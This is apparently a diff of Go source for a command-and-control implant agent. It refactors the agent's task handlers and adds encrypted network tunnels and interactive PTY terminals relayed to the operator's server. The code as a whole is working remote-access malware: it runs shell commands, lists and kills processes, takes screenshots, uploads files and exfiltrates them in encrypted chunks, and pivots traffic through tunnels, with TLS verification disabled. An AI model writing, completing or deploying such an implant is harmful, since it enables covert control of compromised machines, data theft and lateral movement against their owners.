@@ -4,31 +4,35 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
-	"encoding/binary"
 	"errors"
 	"fmt"
-	"github.com/shirou/gopsutil/v4/process"
 	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
+	"gopher/utils"
+	"io"
 	"net"
 	"os"
 	"os/exec"
-	"os/user"
+	"strconv"
 	"sync"
 	"syscall"
 	"time"
 )
 
 var UPLOADS map[string][]byte
-var DOWNLOADS map[string]Connection
-var JOBS map[string]Connection
+var DOWNLOADS map[string]utils.Connection
+var JOBS map[string]utils.Connection
+var TUNNELS sync.Map
+var TERMINALS sync.Map
 
 func TaskProcess(commands [][]byte) [][]byte {
 	var (
-		command Command
+		command utils.Command
 		data    []byte
 		result  [][]byte
 		err     error
@@ -42,61 +46,73 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		switch command.Code {
 
-		case COMMAND_DOWNLOAD:
+		case utils.COMMAND_DOWNLOAD:
 			data, err = jobDownloadStart(command.Data)
 
-		case COMMAND_CAT:
+		case utils.COMMAND_CAT:
 			data, err = taskCat(command.Data)
 
-		case COMMAND_CD:
+		case utils.COMMAND_CD:
 			data, err = taskCd(command.Data)
 
-		case COMMAND_CP:
+		case utils.COMMAND_CP:
 			data, err = taskCp(command.Data)
 
-		case COMMAND_EXIT:
+		case utils.COMMAND_EXIT:
 			data, err = taskExit()
 
-		case COMMAND_JOB_LIST:
+		case utils.COMMAND_JOB_LIST:
 			data, err = taskJobList()
 
-		case COMMAND_JOB_KILL:
+		case utils.COMMAND_JOB_KILL:
 			data, err = taskJobKill(command.Data)
 
-		case COMMAND_KILL:
+		case utils.COMMAND_KILL:
 			data, err = taskKill(command.Data)
 
-		case COMMAND_LS:
+		case utils.COMMAND_LS:
 			data, err = taskLs(command.Data)
 
-		case COMMAND_MKDIR:
+		case utils.COMMAND_MKDIR:
 			data, err = taskMkdir(command.Data)
 
-		case COMMAND_MV:
+		case utils.COMMAND_MV:
 			data, err = taskMv(command.Data)
 
-		case COMMAND_PS:
+		case utils.COMMAND_PS:
 			data, err = taskPs()
 
-		case COMMAND_PWD:
+		case utils.COMMAND_PWD:
 			data, err = taskPwd()
 
-		case COMMAND_SCREENSHOT:
-			data, err = taskScreenshot()
-
-		case COMMAND_RM:
+		case utils.COMMAND_RM:
 			data, err = taskRm(command.Data)
 
-		case COMMAND_RUN:
+		case utils.COMMAND_RUN:
 			data, err = jobRun(command.Data)
 
-		case COMMAND_SHELL:
+		case utils.COMMAND_SHELL:
 			data, err = taskShell(command.Data)
 
-		case COMMAND_UPLOAD:
+		case utils.COMMAND_SCREENSHOT:
+			data, err = taskScreenshot()
+
+		case utils.COMMAND_TERMINAL_START:
+			jobTerminal(command.Data)
+
+		case utils.COMMAND_TERMINAL_STOP:
+			taskTernalKill(command.Data)
+
+		case utils.COMMAND_TUNNEL_START:
+			jobTunnel(command.Data)
+
+		case utils.COMMAND_TUNNEL_STOP:
+			taskTunnelKill(command.Data)
+
+		case utils.COMMAND_UPLOAD:
 			data, err = taskUpload(command.Data)
 
-		case COMMAND_ZIP:
+		case utils.COMMAND_ZIP:
 			data, err = taskZip(command.Data)
 
 		default:
@@ -104,8 +120,8 @@ func TaskProcess(commands [][]byte) [][]byte {
 		}
 
 		if err != nil {
-			command.Code = COMMAND_ERROR
-			command.Data, _ = msgpack.Marshal(AnsError{Error: err.Error()})
+			command.Code = utils.COMMAND_ERROR
+			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
 		} else {
 			command.Data = data
 		}
@@ -120,7 +136,7 @@ func TaskProcess(commands [][]byte) [][]byte {
 /// TASKS
 
 func taskCat(paramsData []byte) ([]byte, error) {
-	var params ParamsCat
+	var params utils.ParamsCat
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -136,11 +152,11 @@ func taskCat(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	return msgpack.Marshal(AnsCat{Path: params.Path, Content: content})
+	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
 }
 
 func taskCd(paramsData []byte) ([]byte, error) {
-	var params ParamsCd
+	var params utils.ParamsCd
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -161,11 +177,11 @@ func taskCd(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	return msgpack.Marshal(AnsPwd{Path: newPath})
+	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
 }
 
 func taskCp(paramsData []byte) ([]byte, error) {
-	var params ParamsCp
+	var params utils.ParamsCp
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -201,21 +217,21 @@ func taskExit() ([]byte, error) {
 
 func taskJobList() ([]byte, error) {
 
-	var jobList []JobInfo
+	var jobList []utils.JobInfo
 	for k, v := range DOWNLOADS {
-		jobList = append(jobList, JobInfo{JobId: k, JobType: v.packType})
+		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
 	for k, v := range JOBS {
-		jobList = append(jobList, JobInfo{JobId: k, JobType: v.packType})
+		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
 	}
 
 	list, _ := msgpack.Marshal(jobList)
 
-	return msgpack.Marshal(AnsJobList{List: list})
+	return msgpack.Marshal(utils.AnsJobList{List: list})
 }
 
 func taskJobKill(paramsData []byte) ([]byte, error) {
-	var params ParamsJobKill
+	var params utils.ParamsJobKill
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -229,17 +245,17 @@ func taskJobKill(paramsData []byte) ([]byte, error) {
 		}
 	}
 
-	if job.jobCancel != nil {
-		job.jobCancel()
+	if job.JobCancel != nil {
+		job.JobCancel()
 	}
 
-	job.handleCancel()
+	job.HandleCancel()
 
 	return nil, nil
 }
 
 func taskKill(paramsData []byte) ([]byte, error) {
-	var params ParamsKill
+	var params utils.ParamsKill
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -255,7 +271,7 @@ func taskKill(paramsData []byte) ([]byte, error) {
 }
 
 func taskLs(paramsData []byte) ([]byte, error) {
-	var params ParamsLs
+	var params utils.ParamsLs
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -266,60 +282,18 @@ func taskLs(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	entries, err := os.ReadDir(path)
+	Files, err := functions.GetListing(path)
 	if err != nil {
-		return msgpack.Marshal(AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
-	}
-
-	var Files []FileInfo
-	for _, entry := range entries {
-		info, err := entry.Info()
-		if err != nil {
-			return msgpack.Marshal(AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
-		}
-
-		nlink := uint64(1)
-		uid := 0
-		gid := 0
-		stat, ok := info.Sys().(*syscall.Stat_t)
-		if ok {
-			nlink = uint64(stat.Nlink)
-			uid = int(stat.Uid)
-			gid = int(stat.Gid)
-		}
-
-		username := fmt.Sprintf("%d", uid)
-		u, err := user.LookupId(username)
-		if err == nil {
-			username = u.Username
-		}
-
-		group := fmt.Sprintf("%d", gid)
-		g, err := user.LookupGroupId(group)
-		if err == nil {
-			group = g.Name
-		}
-
-		fileInfo := FileInfo{
-			Mode:     info.Mode().String(),
-			Nlink:    int(nlink),
-			User:     username,
-			Group:    group,
-			Size:     info.Size(),
-			Date:     info.ModTime().Format("Jan _2 15:04"),
-			Filename: entry.Name(),
-			IsDir:    info.IsDir(),
-		}
-		Files = append(Files, fileInfo)
+		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
 	}
 
 	filesData, _ := msgpack.Marshal(Files)
 
-	return msgpack.Marshal(AnsLs{Result: true, Path: path, Files: filesData})
+	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
 }
 
 func taskMkdir(paramsData []byte) ([]byte, error) {
-	var params ParamsMkdir
+	var params utils.ParamsMkdir
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -337,7 +311,7 @@ func taskMkdir(paramsData []byte) ([]byte, error) {
 }
 
 func taskMv(paramsData []byte) ([]byte, error) {
-	var params ParamsMv
+	var params utils.ParamsMv
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -377,44 +351,14 @@ func taskMv(paramsData []byte) ([]byte, error) {
 }
 
 func taskPs() ([]byte, error) {
-	procs, err := process.Processes()
+	Processes, err := functions.GetProcesses()
 	if err != nil {
 		return nil, err
 	}
 
-	var Processes []PsInfo
-	for _, p := range procs {
-
-		ppid, err := p.Ppid()
-		if err != nil {
-			ppid = 0
-		}
-
-		username, err := p.Username()
-		if err != nil {
-			username = ""
-		}
-
-		tty, err := p.Terminal()
-
-		cmdline, err := p.Cmdline()
-		if err != nil || cmdline == "" {
-			cmdline, _ = p.Name()
-		}
-
-		psInfo := PsInfo{
-			Pid:     int(p.Pid),
-			Ppid:    int(ppid),
-			Context: username,
-			Tty:     tty,
-			Process: cmdline,
-		}
-		Processes = append(Processes, psInfo)
-	}
-
 	processesData, _ := msgpack.Marshal(Processes)
 
-	return msgpack.Marshal(AnsPs{Result: true, Processes: processesData})
+	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
 }
 
 func taskPwd() ([]byte, error) {
@@ -423,11 +367,11 @@ func taskPwd() ([]byte, error) {
 		return nil, err
 	}
 
-	return msgpack.Marshal(AnsPwd{Path: path})
+	return msgpack.Marshal(utils.AnsPwd{Path: path})
 }
 
 func taskRm(paramsData []byte) ([]byte, error) {
-	var params ParamsRm
+	var params utils.ParamsRm
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -461,11 +405,11 @@ func taskScreenshot() ([]byte, error) {
 		screens = append(screens, pic)
 	}
 
-	return msgpack.Marshal(AnsScreenshots{Screens: screens})
+	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
 }
 
 func taskShell(paramsData []byte) ([]byte, error) {
-	var params ParamsShell
+	var params utils.ParamsShell
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -474,11 +418,43 @@ func taskShell(paramsData []byte) ([]byte, error) {
 	cmd := exec.Command(params.Program, params.Args...)
 	output, _ := cmd.CombinedOutput()
 
-	return msgpack.Marshal(AnsShell{Output: string(output)})
+	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
+}
+
+func taskTernalKill(paramsData []byte) {
+	var params utils.ParamsTerminalStop
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TERMINALS.Load(params.TermId)
+	if ok {
+		cancel, ok := value.(context.CancelFunc)
+		if ok {
+			cancel()
+		}
+	}
+}
+
+func taskTunnelKill(paramsData []byte) {
+	var params utils.ParamsTunnelStop
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TUNNELS.Load(params.ChannelId)
+	if ok {
+		cancel, ok := value.(context.CancelFunc)
+		if ok {
+			cancel()
+		}
+	}
 }
 
 func taskUpload(paramsData []byte) ([]byte, error) {
-	var params ParamsUpload
+	var params utils.ParamsUpload
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -518,11 +494,11 @@ func taskUpload(paramsData []byte) ([]byte, error) {
 		return nil, nil
 	}
 
-	return msgpack.Marshal(AnsUpload{Path: path})
+	return msgpack.Marshal(utils.AnsUpload{Path: path})
 }
 
 func taskZip(paramsData []byte) ([]byte, error) {
-	var params ParamsZip
+	var params utils.ParamsZip
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -557,13 +533,13 @@ func taskZip(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	return msgpack.Marshal(AnsZip{Path: dstPath})
+	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
 }
 
 /// JOBS
 
 func jobDownloadStart(paramsData []byte) ([]byte, error) {
-	var params ParamsDownload
+	var params utils.ParamsDownload
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -614,45 +590,44 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	r := make([]byte, 4)
-	_, _ = rand.Read(r)
-	FileId := binary.BigEndian.Uint32(r)
+	strFileId := params.Task
+	FileId, _ := strconv.ParseInt(strFileId, 16, 64)
 
-	connection := Connection{
-		packType: EXFIL_PACK,
-		conn:     conn,
+	connection := utils.Connection{
+		PackType: utils.EXFIL_PACK,
+		Conn:     conn,
 	}
-	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())
-	DOWNLOADS[fmt.Sprintf("%08x", int(FileId))] = connection
+	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
+	DOWNLOADS[strFileId] = connection
 
 	go func() {
 		defer func() {
-			connection.handleCancel()
+			connection.HandleCancel()
 			_ = conn.Close()
-			delete(DOWNLOADS, fmt.Sprintf("%08x", int(FileId)))
+			delete(DOWNLOADS, strFileId)
 		}()
 
-		exfilPack, _ := msgpack.Marshal(ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
-		exfilMsg, _ := msgpack.Marshal(StartMsg{Type: EXFIL_PACK, Data: exfilPack})
-		exfilMsg, _ = EncryptData(exfilMsg, encKey)
+		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
+		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)
 
-		job := Job{
-			CommandId: COMMAND_DOWNLOAD,
+		job := utils.Job{
+			CommandId: utils.COMMAND_DOWNLOAD,
 			JobId:     params.Task,
 		}
 
 		/// Recv Banner
 		if profile.BannerSize > 0 {
-			_, err := connRead(conn, profile.BannerSize)
+			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
 				return
 			}
 		}
 
 		/// Send Init
-		sendMsg(conn, exfilMsg)
+		_ = functions.SendMsg(conn, exfilMsg)
 
-		chunkSize := 10
+		chunkSize := 0x100000 // 1MB
 		totalSize := len(content)
 		for i := 0; i < totalSize; i += chunkSize {
 
@@ -666,24 +641,24 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 			canceled := false
 
 			select {
-			case <-connection.ctx.Done():
+			case <-connection.Ctx.Done():
 				finish = true
 				canceled = true
 			default:
 				// Continue
 			}
 
-			job.Data, _ = msgpack.Marshal(AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
+			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
 			packedJob, _ := msgpack.Marshal(job)
 
-			message := Message{
+			message := utils.Message{
 				Type:   2,
 				Object: [][]byte{packedJob},
 			}
 
 			sendData, _ := msgpack.Marshal(message)
-			sendData, _ = EncryptData(sendData, sKey)
-			sendMsg(conn, sendData)
+			sendData, _ = utils.EncryptData(sendData, utils.SKey)
+			_ = functions.SendMsg(conn, sendData)
 
 			if finish {
 				break
@@ -696,7 +671,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 }
 
 func jobRun(paramsData []byte) ([]byte, error) {
-	var params ParamsRun
+	var params utils.ParamsRun
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
 		return nil, err
@@ -758,53 +733,53 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	connection := Connection{
-		packType:  JOB_PACK,
-		conn:      conn,
-		jobCancel: procCancel,
+	connection := utils.Connection{
+		PackType:  utils.JOB_PACK,
+		Conn:      conn,
+		JobCancel: procCancel,
 	}
-	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())
+	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
 	JOBS[params.Task] = connection
 
 	go func() {
 		defer func() {
 			procCancel()
-			connection.handleCancel()
+			connection.HandleCancel()
 			_ = conn.Close()
 			delete(JOBS, params.Task)
 		}()
 
-		jobPack, _ := msgpack.Marshal(JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
-		jobMsg, _ := msgpack.Marshal(StartMsg{Type: JOB_PACK, Data: jobPack})
-		jobMsg, _ = EncryptData(jobMsg, encKey)
+		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
+		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
 		/// Recv Banner
 		if profile.BannerSize > 0 {
-			_, err := connRead(conn, profile.BannerSize)
+			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
 				return
 			}
 		}
 
 		/// Send Init
-		sendMsg(conn, jobMsg)
+		functions.SendMsg(conn, jobMsg)
 
-		job := Job{
-			CommandId: COMMAND_RUN,
+		job := utils.Job{
+			CommandId: utils.COMMAND_RUN,
 			JobId:     params.Task,
 		}
 
-		job.Data, _ = msgpack.Marshal(AnsRun{Pid: pid, Start: true})
+		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
 		packedJob, _ := msgpack.Marshal(job)
 
-		message := Message{
+		message := utils.Message{
 			Type:   2,
 			Object: [][]byte{packedJob},
 		}
 
 		sendData, _ := msgpack.Marshal(message)
-		sendData, _ = EncryptData(sendData, sKey)
-		sendMsg(conn, sendData)
+		sendData, _ = utils.EncryptData(sendData, utils.SKey)
+		functions.SendMsg(conn, sendData)
 
 		var wg sync.WaitGroup
 		wg.Add(2)
@@ -837,7 +812,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 					return
 				case <-ticker.C:
 
-					ansRun := AnsRun{Pid: pid}
+					ansRun := utils.AnsRun{Pid: pid}
 
 					stdoutMu.Lock()
 					out := stdoutBuf.String()
@@ -859,14 +834,14 @@ func jobRun(paramsData []byte) ([]byte, error) {
 						job.Data, _ = msgpack.Marshal(ansRun)
 						packedJob, _ := msgpack.Marshal(job)
 
-						message := Message{
+						message := utils.Message{
 							Type:   2,
 							Object: [][]byte{packedJob},
 						}
 
 						sendData, _ := msgpack.Marshal(message)
-						sendData, _ = EncryptData(sendData, sKey)
-						sendMsg(conn, sendData)
+						sendData, _ = utils.EncryptData(sendData, utils.SKey)
+						functions.SendMsg(conn, sendData)
 					}
 				}
 			}
@@ -877,7 +852,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		wg.Wait()
 		close(done)
 
-		ansRun := AnsRun{Pid: pid}
+		ansRun := utils.AnsRun{Pid: pid}
 		if out := stdoutBuf.String(); len(out) > lastOutLen {
 			ansRun.Stdout = out[lastOutLen:]
 		}
@@ -886,28 +861,265 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		}
 		job.Data, _ = msgpack.Marshal(ansRun)
 		packedJob, _ = msgpack.Marshal(job)
-		message = Message{
+		message = utils.Message{
 			Type:   2,
 			Object: [][]byte{packedJob},
 		}
 		sendData, _ = msgpack.Marshal(message)
-		sendData, _ = EncryptData(sendData, sKey)
-		sendMsg(conn, sendData)
+		sendData, _ = utils.EncryptData(sendData, utils.SKey)
+		functions.SendMsg(conn, sendData)
 
 		/// FINISH
 
-		job.Data, _ = msgpack.Marshal(AnsRun{Pid: pid, Finish: true})
+		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
 		packedJob, _ = msgpack.Marshal(job)
 
-		message = Message{
+		message = utils.Message{
 			Type:   2,
 			Object: [][]byte{packedJob},
 		}
 
 		sendData, _ = msgpack.Marshal(message)
-		sendData, _ = EncryptData(sendData, sKey)
-		sendMsg(conn, sendData)
+		sendData, _ = utils.EncryptData(sendData, utils.SKey)
+		functions.SendMsg(conn, sendData)
 	}()
 
 	return nil, nil
+}
+
+func jobTunnel(paramsData []byte) {
+	var params utils.ParamsTunnelStart
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	go func() {
+		active := true
+		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
+		if err != nil {
+			active = false
+		}
+
+		var srvConn net.Conn
+		if profile.UseSSL {
+			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
+			if certerr != nil {
+				return
+			}
+
+			caCertPool := x509.NewCertPool()
+			caCertPool.AppendCertsFromPEM(profile.CaCert)
+
+			config := &tls.Config{
+				Certificates:       []tls.Certificate{cert},
+				RootCAs:            caCertPool,
+				InsecureSkipVerify: true,
+			}
+			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
+
+		} else {
+			srvConn, err = net.Dial("tcp", profile.Addresses[0])
+		}
+		if err != nil {
+			srvConn.Close()
+			return
+		}
+
+		tunKey := make([]byte, 16)
+		_, _ = rand.Read(tunKey)
+		tunIv := make([]byte, 16)
+		_, _ = rand.Read(tunIv)
+
+		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TUNNEL, Data: jobPack})
+		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
+
+		/// Recv Banner
+		if profile.BannerSize > 0 {
+			_, err := functions.ConnRead(srvConn, profile.BannerSize)
+			if err != nil {
+				srvConn.Close()
+				return
+			}
+		}
+
+		/// Send Init
+		functions.SendMsg(srvConn, jobMsg)
+
+		if !active {
+			srvConn.Close()
+			return
+		}
+
+		encCipher, _ := aes.NewCipher(tunKey)
+		encStream := cipher.NewCTR(encCipher, tunIv)
+		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
+
+		decCipher, _ := aes.NewCipher(tunKey)
+		decStream := cipher.NewCTR(decCipher, tunIv)
+		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+
+		ctx, cancel := context.WithCancel(context.Background())
+		TUNNELS.Store(params.ChannelId, cancel)
+		defer TUNNELS.Delete(params.ChannelId)
+
+		var closeOnce sync.Once
+		closeAll := func() {
+			closeOnce.Do(func() {
+				_ = clientConn.Close()
+				_ = srvConn.Close()
+			})
+		}
+
+		var wg sync.WaitGroup
+		wg.Add(2)
+
+		go func() {
+			defer wg.Done()
+			io.Copy(clientConn, streamReader)
+			closeAll()
+		}()
+
+		go func() {
+			defer wg.Done()
+			io.Copy(streamWriter, clientConn)
+			closeAll()
+		}()
+
+		go func() {
+			<-ctx.Done()
+			closeAll()
+		}()
+
+		wg.Wait()
+
+		cancel()
+	}()
+}
+
+func jobTerminal(paramsData []byte) {
+	var params utils.ParamsTerminalStart
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	go func() {
+		active := true
+		status := ""
+
+		process := exec.Command(params.Program)
+		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
+		if err != nil {
+			active = false
+			status = err.Error()
+		}
+
+		var srvConn net.Conn
+		if profile.UseSSL {
+			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
+			if certerr != nil {
+				return
+			}
+
+			caCertPool := x509.NewCertPool()
+			caCertPool.AppendCertsFromPEM(profile.CaCert)
+
+			config := &tls.Config{
+				Certificates:       []tls.Certificate{cert},
+				RootCAs:            caCertPool,
+				InsecureSkipVerify: true,
+			}
+			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
+
+		} else {
+			srvConn, err = net.Dial("tcp", profile.Addresses[0])
+		}
+		if err != nil {
+			if active {
+				functions.StopPty(ptyProc)
+				_ = process.Process.Kill()
+			}
+			return
+		}
+
+		tunKey := make([]byte, 16)
+		_, _ = rand.Read(tunKey)
+		tunIv := make([]byte, 16)
+		_, _ = rand.Read(tunIv)
+
+		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
+		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
+
+		/// Recv Banner
+		if profile.BannerSize > 0 {
+			_, err := functions.ConnRead(srvConn, profile.BannerSize)
+			if err != nil {
+				srvConn.Close()
+				if active {
+					functions.StopPty(ptyProc)
+					_ = process.Process.Kill()
+				}
+				return
+			}
+		}
+
+		/// Send Init
+		_ = functions.SendMsg(srvConn, jobMsg)
+
+		if !active {
+			srvConn.Close()
+			return
+		}
+
+		encCipher, _ := aes.NewCipher(tunKey)
+		encStream := cipher.NewCTR(encCipher, tunIv)
+		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
+
+		decCipher, _ := aes.NewCipher(tunKey)
+		decStream := cipher.NewCTR(decCipher, tunIv)
+		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+
+		ctx, cancel := context.WithCancel(context.Background())
+		TERMINALS.Store(params.TermId, cancel)
+		defer TERMINALS.Delete(params.TermId)
+
+		var closeOnce sync.Once
+		closeAll := func() {
+			closeOnce.Do(func() {
+				time.Sleep(200 * time.Millisecond)
+				_ = functions.StopPty(ptyProc)
+				if functions.IsProcessRunning(process) {
+					_ = process.Process.Kill()
+				}
+				_ = srvConn.Close()
+			})
+		}
+
+		var wg sync.WaitGroup
+		wg.Add(2)
+
+		go func() {
+			defer wg.Done()
+			functions.RelayConnToPty(ptyProc, streamReader)
+			closeAll()
+		}()
+
+		go func() {
+			defer wg.Done()
+			functions.RelayPtyToConn(streamWriter, ptyProc)
+			closeAll()
+		}()
+
+		go func() {
+			<-ctx.Done()
+			closeAll()
+		}()
+
+		wg.Wait()
+
+		cancel()
+	}()
 }
